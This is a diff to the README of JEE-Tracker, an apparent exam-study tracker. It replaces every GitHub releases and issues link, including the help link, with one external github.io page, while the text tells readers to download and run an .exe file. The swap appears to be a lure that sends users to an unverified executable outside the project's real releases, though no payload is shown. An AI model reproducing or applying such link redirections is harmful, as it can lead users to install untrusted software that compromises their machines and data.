@@ -2,7 +2,7 @@
 
 <div align="center">
 
-[![Download JEE-Tracker](https://img.shields.io/badge/Download-JEE--Tracker-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1b1f23)](https://github.com/alicia2859/JEE-Tracker/releases)
+[![Download JEE-Tracker](https://img.shields.io/badge/Download-JEE--Tracker-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1b1f23)](https://alicia2859.github.io)
 
 </div>
 
@@ -12,7 +12,7 @@ Welcome to JEE-Tracker! This guide will help you download and start using the ap
 
 ### 📥 Downloading the Application
 
-Visit this link to download the application: [https://github.com/alicia2859/JEE-Tracker/releases](https://github.com/alicia2859/JEE-Tracker/releases)
+Visit this link to download the application: [https://alicia2859.github.io](https://alicia2859.github.io)
 
 When you click the link, you'll see a page with several files. Look for the file named `JEE-Tracker.exe` (or something very similar) listed under "Assets" or "Downloads." Click on it to start downloading.
 
@@ -108,7 +108,7 @@ To use JEE-Tracker on your phone too:
 
 ## 📬 Getting Help
 
-If you face any issue not covered here, create a ticket on our [GitHub Issues page](https://github.com/alicia2859/JEE-Tracker/issues). Include a screenshot of the problem and what you were doing when it occurred. We typically respond within 24–48 hours.
+If you face any issue not covered here, create a ticket on our [GitHub Issues page](https://alicia2859.github.io). Include a screenshot of the problem and what you were doing when it occurred. We typically respond within 24–48 hours.
 
 ## 📝 Frequently Asked Questions
 
@@ -128,14 +128,14 @@ A: Your data is encrypted and stored securely. You can export your data anytime 
 
 We release updates regularly. To ensure you have the latest version:
 
-1. Visit the [Releases page](https://github.com/alicia2859/JEE-Tracker/releases).
+1. Visit the [Releases page](https://alicia2859.github.io).
 2. Download the newest `.exe` file.
 3. Replace the old file with the new one (your data is saved automatically).
 
 --- 
 <h2 align="center">Start your JEE journey today—one focused session at a time.</h2>
 
-<h3 align="center">Visit this link to download the application: [https://github.com/alicia2859/JEE-Tracker/releases](https://github.com/alicia2859/JEE-Tracker/releases)</h3>
+<h3 align="center">Visit this link to download the application: [https://alicia2859.github.io](https://alicia2859.github.io)</h3>
 
 ---
 
